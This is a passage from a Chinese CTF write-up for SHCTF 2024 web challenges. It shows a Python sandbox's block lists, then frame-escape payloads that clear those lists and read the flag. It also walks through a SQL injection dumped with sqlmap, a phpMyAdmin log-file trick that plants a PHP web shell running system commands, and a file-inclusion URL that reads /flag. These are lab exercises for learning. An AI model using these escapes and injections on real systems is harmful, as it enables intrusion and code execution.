</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>evaluate_expression</span>(self, expression):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> var, value <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>variables<span style=color:#f92672>.</span>items():  
</span></span><span style=display:flex><span>            expression <span style=color:#f92672>=</span> expression<span style=color:#f92672>.</span>replace(var, str(value))  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> eval(expression, {}, {})
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:  
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;执行出错: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span> 
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>safe_executer</span>(self, expression):    
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> audit_enabled
</span></span><span style=display:flex><span>        output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exec_code</span>(code):
</span></span><span style=display:flex><span>            outputIO <span style=color:#f92672>=</span> StringIO()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>with</span> redirect_stdout(outputIO):
</span></span><span style=display:flex><span>                exec(code, {
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;__builtins__&#34;</span>: <span style=color:#66d9ef>None</span>,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;print&#34;</span>: print
</span></span><span style=display:flex><span>                }, <span style=color:#66d9ef>None</span>)
</span></span><span style=display:flex><span>            output <span style=color:#f92672>=</span> outputIO<span style=color:#f92672>.</span>getvalue()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> output
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> var, value <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>variables<span style=color:#f92672>.</span>items():  
</span></span><span style=display:flex><span>            expression <span style=color:#f92672>=</span> expression<span style=color:#f92672>.</span>replace(var, str(value))  
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>clever_checker(expression) <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>(<span style=color:#e6db74>&#34;大傻春 你要干什么！&#34;</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        code <span style=color:#f92672>=</span> compile(expression, <span style=color:#e6db74>&#34;&lt;sandbox&gt;&#34;</span>, <span style=color:#e6db74>&#34;exec&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#75715e># 启用审计</span>
</span></span><span style=display:flex><span>        audit_enabled <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:  
</span></span><span style=display:flex><span>            output <span style=color:#f92672>=</span> exec_code(code)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:  
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;执行出错: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>finally</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># 关闭审计</span>
</span></span><span style=display:flex><span>            audit_enabled <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> output
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>checker</span>(self, code):
</span></span><span style=display:flex><span>        allow_chr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0cdhor+-*/=()&#34;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>; &#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> code:  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> char <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> allow_chr:  
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>    
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>clever_checker</span>(self, code):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>simple_checker</span>(source):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                source<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;ascii&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>UnicodeEncodeError</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> dangerous <span style=color:#f92672>in</span> dangerous_strings:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> dangerous <span style=color:#f92672>in</span> source<span style=color:#f92672>.</span>lower():
</span></span><span style=display:flex><span>                    print(dangerous)
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>opcode_checker</span>(code):
</span></span><span style=display:flex><span>            <span style=color:#f92672>from</span> dis <span style=color:#f92672>import</span> dis
</span></span><span style=display:flex><span>            <span style=color:#f92672>from</span> io <span style=color:#f92672>import</span> StringIO
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            opcode_output <span style=color:#f92672>=</span> StringIO()
</span></span><span style=display:flex><span>            dis(code, file<span style=color:#f92672>=</span>opcode_output)
</span></span><span style=display:flex><span>            opcodes <span style=color:#f92672>=</span> opcode_output<span style=color:#f92672>.</span>getvalue()<span style=color:#f92672>.</span>splitlines()
</span></span><span style=display:flex><span>            opcode_output<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> opcodes:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> any(opcode <span style=color:#f92672>in</span> line <span style=color:#66d9ef>for</span> opcode <span style=color:#f92672>in</span> dangerous_opcodes):
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> any(func <span style=color:#f92672>in</span> line <span style=color:#66d9ef>for</span> func <span style=color:#f92672>in</span> allowed_functions):
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(opcode <span style=color:#66d9ef>for</span> opcode <span style=color:#f92672>in</span> dangerous_opcodes <span style=color:#66d9ef>if</span> opcode <span style=color:#f92672>in</span> line))
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> simple_checker(code) <span style=color:#f92672>and</span> opcode_checker(code)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>block_wrapper</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>audit</span>(event, args):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> audit_enabled, dangerous_operation_detected
</span></span><span style=display:flex><span>        dangerous_operation_detected <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> audit_enabled:
</span></span><span style=display:flex><span>            event_info <span style=color:#f92672>=</span> event <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(str(arg) <span style=color:#66d9ef>for</span> arg <span style=color:#f92672>in</span> args)
</span></span><span style=display:flex><span>            event_info_lower <span style=color:#f92672>=</span> event_info<span style=color:#f92672>.</span>lower()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> dangerous <span style=color:#f92672>in</span> dangerous_operations:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> dangerous <span style=color:#f92672>in</span> event_info_lower:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>global</span>  dangerous_operation
</span></span><span style=display:flex><span>                    dangerous_operation_detected <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>                    dangerous_operation <span style=color:#f92672>=</span> dangerous
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> audit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>executer</span>(code):
</span></span><span style=display:flex><span>    outputIO <span style=color:#f92672>=</span> StringIO()
</span></span><span style=display:flex><span>    interpreter <span style=color:#f92672>=</span> CleverInterpreter()  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> redirect_stdout(outputIO):
</span></span><span style=display:flex><span>        interpreter<span style=color:#f92672>.</span>interpret(code)
</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> outputIO<span style=color:#f92672>.</span>getvalue()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> dangerous_operation_detected:
</span></span><span style=display:flex><span>        output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;危险操作: &#34;</span> <span style=color:#f92672>+</span> dangerous_operation)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>(output)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:  
</span></span><span style=display:flex><span>    addaudithook(block_wrapper())
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>, host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>)
</span></span></code></pre></div><p>参考文章https://www.cnblogs.com/gaorenyusi/p/18242719</p><p>考察的是python栈帧沙箱逃逸(妹听过啊)</p><p>三个安全模块是通过遍历下面三个列表对代码进行过滤的，而通过栈帧逃逸，我们可以访问到全局变量，因此只需要获取到全局变量表，将下面三个列表设为空即可</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>dangerous_operations <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;marshal&#34;</span>, <span style=color:#e6db74>&#34;__new__&#34;</span>, <span style=color:#e6db74>&#34;process&#34;</span>, <span style=color:#e6db74>&#34;os&#34;</span>, <span style=color:#e6db74>&#34;sys&#34;</span>, <span style=color:#e6db74>&#34;interpreter&#34;</span>, <span style=color:#e6db74>&#34;open&#34;</span>, 
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;cpython&#34;</span>, <span style=color:#e6db74>&#34;compile&#34;</span>, <span style=color:#e6db74>&#34;gc&#34;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>dangerous_strings <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;__&#34;</span>, <span style=color:#e6db74>&#34;getattr&#34;</span>, <span style=color:#e6db74>&#34;exit&#34;</span>]
</span></span><span style=display:flex><span>dangerous_opcodes <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;LOAD_GLOBAL&#34;</span>, <span style=color:#e6db74>&#34;IMPORT_NAME&#34;</span>, <span style=color:#e6db74>&#34;LOAD_METHOD&#34;</span>]
</span></span></code></pre></div><p>注意要把题目里的print闭合，官p说的是在前面的改</p><p>先输入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sentence <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;0)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>def exp():
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    def scq():
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        yield scq.gi_frame.f_back
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    scq = scq()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    frame = [x for x in scq][0]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    frame.f_back.f_back.f_back.f_globals[&#34;dangerous_operations&#34;] = []
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    frame.f_back.f_back.f_back.f_globals[&#34;dangerous_opcodes&#34;] = []
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    frame.f_back.f_back.f_back.f_globals[&#34;dangerous_strings&#34;] = []
</span></span></span><span style=display:flex><span><span style=color:#e6db74>exp()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>print(0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div><p><img alt=27 loading=lazy src=/posts/ctf/shctf2024/27.png></p><p>设置完成后就可以直接读取flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>sentence <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;0)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>def exp():
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    def scq():
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        yield scq.gi_frame.f_back
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    scq = scq()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    frame = [x for x in scq][0]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    gattr = frame.f_back.f_back.f_back.f_globals[&#34;_&#34;*2+&#34;builtins&#34;+&#34;_&#34;*2]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    open = gattr.open
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    print(open(&#34;/fl44gggg&#34;, &#34;r&#34;).read())
</span></span></span><span style=display:flex><span><span style=color:#e6db74>exp()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>print(0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div><p><img alt=28 loading=lazy src=/posts/ctf/shctf2024/28.png></p><p>只是浮现了一下，知识点会放在学习计划中</p><h3 id=可恶的骗子>可恶的骗子</h3><p>官方给了两个解法都学习一下</p><h4 id=0x01>0x01</h4><p><img alt=29 loading=lazy src=/posts/ctf/shctf2024/29.png></p><p>聊天记录内url拼接到靶机，显示用手机打开，使用手机ua进行访问</p><p>ClickID参数单引号报错，存在sql注入</p><p>构造一个ua头</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/Xianyu_goods/index.php?ClickID<span style=color:#f92672>=</span>161<span style=color:#960050;background-color:#1e0010>&#39;</span>
</span></span></code></pre></div><p>加个单引号发现有sql的报错</p><p>用sqlmap跑一下看看</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u http://210.44.150.15:36930/Xianyu_goods/index.php?ClickID<span style=color:#f92672>=</span><span style=color:#ae81ff>161</span> --user-agent<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36&#39;</span> -D root -T admin_user --dump
</span></span></code></pre></div><p>最后的数据是</p><img src=../../images/shctf/2024/30.png alt=30 style=zoom:80%><p><code>root::shctf_xianyu_password</code>登入后台</p><p>具体getshell流程可以参考这篇<a href=https://cloud.tencent.com/developer/article/1540506>phpMyAdmin利用日志文件GetSHELL-腾讯云开发者社区-腾讯云</a></p><p>登陆后使用日志写入php代码，首先启用日志</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Set global general_log = on;
</span></span></code></pre></div><p>接着设置日志路径，扫描后发现Xianyu_goods下有go.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Set global general_log_file = &#39;/var/www/html/Xianyu_goods/go.php&#39;;
</span></span></code></pre></div><p>然后执行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>select &#39;&lt;?php system(&#34;cat /flag&#34;); ?&gt;&#39;;
</span></span></code></pre></div><p>最后进入对应界面就好了</p><p><img alt=31 loading=lazy src=/posts/ctf/shctf2024/31.png></p><h4 id=0x02>0x02</h4><p>根据聊天记录，网上搜索仿咸鱼 转转 交易猫系统源码等关键字，找到此系统源码</p><p>下载后使用工具进行审计，发现index.php存在文件包含，通过HTTP参数控制</p><p>文件自己审查一下，用常用的工具审一遍。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/Xianyu_goods/index.php?ClickID<span style=color:#f92672>=</span>161&amp;HTYP<span style=color:#f92672>=</span>/flag
</span></span></code></pre></div></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#week1>week1</a><ul><li><a href=#misc>Misc</a><ul><li><a href=#签到题>签到题</a></li><li><a href=#rasterizing-traffic>Rasterizing Traffic</a></li><li><a href=#拜师之旅>拜师之旅①</a></li><li><a href=#有wifi干嘛不用呢>有WiFi干嘛不用呢？</a></li><li><a href=#真真假假遮遮掩掩>真真假假?遮遮掩掩!</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#ezaes>EzAES</a></li><li><a href=#hello-crypto>Hello Crypto</a></li><li><a href=#baby_mod>baby_mod</a></li><li><a href=#factor>factor</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#签个到吧>签个到吧</a></li><li><a href=#no-stack-overflow1>No stack overflow1</a></li><li><a href=#no-stack-overflow2>No stack overflow2</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#1zflask>1zflask</a></li><li><a href=#ez_gittt>ez_gittt</a></li><li><a href=#蛐蛐蛐蛐>蛐蛐?蛐蛐!</a></li><li><a href=#jvav>jvav</a></li><li><a href=#poppopop>poppopop</a></li><li><a href=#单身十八年的手速>单身十八年的手速</a></li><li><a href=#md5-master>MD5 Master</a></li></ul></li><li><a href=#ai>Ai</a><ul><li><a href=#小助手>小助手</a></li></ul></li><li><a href=#re>Re</a><ul><li><a href=#gamegame>gamegame</a></li><li><a href=#ezapk>ezapk</a></li><li><a href=#ezrc4>ezrc4</a></li><li><a href=#ezxor>ezxor</a></li></ul></li><li><a href=#ppc>PPC</a><ul><li><a href=#绑定qq账号>绑定QQ账号</a></li></ul></li></ul></li><li><a href=#week2>week2</a><ul><li><a href=#web-1>web</a><ul><li><a href=#guess_the_number>guess_the_number</a></li><li><a href=#自助查询>自助查询</a></li><li><a href=#入侵者禁入>入侵者禁入</a></li><li><a href=#dickle>dickle</a></li><li><a href=#登录验证>登录验证</a></li><li><a href=#md5-god复现>MD5 GOD!(复现)</a></li></ul></li><li><a href=#crypto-1>crypto</a><ul><li><a href=#魔鬼的步伐>魔鬼的步伐</a></li><li><a href=#worde很大>worde很大</a></li></ul></li></ul></li><li><a href=#week3>week3</a><ul><li><a href=#crypto-2>crypto</a><ul><li><a href=#babylcg>babyLCG</a></li></ul></li><li><a href=#web-2>web</a><ul><li><a href=#小小cms>小小cms</a></li><li><a href=#love_flask>love_flask</a></li><li><a href=#拜师之旅番外>拜师之旅·番外</a></li><li><a href=#hacked_website复现>hacked_website(复现)</a></li><li><a href=#顰复现>顰(复现)</a></li></ul></li></ul></li><li><a href=#week4>week4</a><ul><li><a href=#crypto-3>crypto</a><ul><li><a href=#mt19937>MT19937</a></li></ul></li><li><a href=#web复现>web(复现)</a><ul><li><a href=#0进制计算器>0进制计算器</a></li><li><a href=#0进制计算器-pro-max>0进制计算器 pro max</a></li><li><a href=#可恶的骗子>可恶的骗子</a></li></ul></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://blog.0ran9e.cn/posts/ctf/newstar2024/><span class=title>«</span><br><span>Newstar2024</span>
</a><a class=next href=http://blog.0ran9e.cn/posts/ctf/ylctf2024/><span class=title>»</span><br><span>YLCTF2024</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer><button id=tocToggleBtn type=button aria-label="Toggle Table of Contents">收起</button>
<script>(function(){const s=document.querySelector("article.post-single > details.toc"),e=document.getElementById("tocToggleBtn");if(!s||!e){e&&(e.style.display="none");return}const t="toc_hidden",n=()=>{const n=localStorage.getItem(t)==="1";document.documentElement.classList.toggle("toc-hidden",n),e.textContent=n?"目录":"收起"};e.addEventListener("click",()=>{const e=!document.documentElement.classList.contains("toc-hidden");localStorage.setItem(t,e?"1":"0"),n()}),n()})()</script><script>(function(){const t=document.getElementById("theme-toggle");if(!t)return;const s="pref-theme",e=document.documentElement,n=t=>{const n=t==="dark";e.classList.toggle("dark",n);try{localStorage.setItem(s,t)}catch{}e.style.display="none",e.offsetHeight,e.style.display=""},o=()=>{let e=null;try{e=localStorage.getItem(s)}catch{}if(e==="dark"||e==="light")return n(e);window.matchMedia&&n(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")};t.dataset.boundTheme||(t.addEventListener("click",()=>{const t=e.classList.contains("dark");n(t?"light":"dark")}),t.dataset.boundTheme="1"),o()})()</script></body></html>